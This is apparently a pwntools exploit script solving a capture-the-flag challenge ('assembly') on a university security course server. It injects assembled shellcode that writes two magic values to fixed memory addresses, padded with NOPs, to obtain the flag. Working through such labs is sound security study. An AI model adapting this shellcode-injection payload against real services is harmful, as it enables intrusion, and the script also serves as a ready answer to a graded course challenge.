from pwn import *

context(arch='amd64', os='linux')

binary = './assembly'
is_local = False
use_gdb_debug = False

secret_addr = 0x404090
data_addr = 0x404098
secret_value = 0x1badb002
data_value = 0xdead10cc

if is_local:
    process_conn = process(binary)
elif use_gdb_debug:
    process_conn = gdb.debug(binary, gdbscript='b main\nc')
else:
    process_conn = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1294)
    process_conn.sendline("<NET ID>")

process_conn.recvuntil(b'Set the right secrets to get the flag!\n')

# Build payload assembly
payload_asm = asm(f"""
    mov rax, {secret_value}          # Load target secret value
    mov [{secret_addr}], rax         # Write to secrets address
    
    mov rax, {data_value}            # Load target data value
    mov [{data_addr}], rax           # Write to data address
""")

# Pad payload to buffer limit
payload_length = 0x50
payload = payload_asm.ljust(payload_length, b"\x90")

process_conn.send(payload)
process_conn.interactive()
